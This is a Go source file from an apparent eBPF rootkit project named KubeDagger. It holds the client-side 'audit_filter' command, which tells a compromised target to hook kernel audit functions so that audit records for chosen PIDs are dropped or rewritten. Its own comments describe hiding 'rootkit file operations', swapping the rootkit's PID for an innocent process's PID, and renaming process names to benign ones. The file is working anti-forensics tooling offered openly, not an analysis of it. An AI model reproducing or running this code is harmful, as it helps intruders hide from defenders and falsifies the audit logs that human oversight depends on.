package audit_filter

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type AuditFilterResult struct {
	Mode    string              `json:"mode"`
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, mode, filterPIDs, output string) error {
	var result *AuditFilterResult

	switch mode {
	case "suppress":
		result = suppressAudit(target, filterPIDs)
	case "modify":
		result = modifyAudit(target, filterPIDs)
	default:
		return fmt.Errorf("unsupported mode: %s (use suppress or modify)", mode)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func suppressAudit(target, filterPIDs string) *AuditFilterResult {
	result := &AuditFilterResult{Mode: "suppress"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"hook_audit_log_start",
			"kprobe on audit_log_start to intercept audit record creation",
			"audit_hook_log_start",
		},
		{
			"configure_pid_filter",
			"populate BPF hash map with PIDs whose audit records should be dropped",
			"audit_set_pid_filter",
		},
		{
			"suppress_syscall_records",
			"prevent audit records from being generated for filtered process syscalls",
			"audit_suppress_syscall",
		},
		{
			"suppress_fs_records",
			"block filesystem access audit records for rootkit file operations",
			"audit_suppress_fs",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + filterPIDs
		status := shared.SendCommand(target, "/audit_filter", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)
	return result
}

func modifyAudit(target, filterPIDs string) *AuditFilterResult {
	result := &AuditFilterResult{Mode: "modify"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"hook_audit_log_end",
			"kprobe on audit_log_end to modify records before they're dispatched",
			"audit_hook_log_end",
		},
		{
			"rewrite_pid_field",
			"replace rootkit PID with innocent process PID in audit records",
			"audit_rewrite_pid",
		},
		{
			"sanitize_comm_field",
			"rewrite process comm field in audit records to benign names",
			"audit_sanitize_comm",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + filterPIDs
		status := shared.SendCommand(target, "/audit_filter", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)
	return result
}
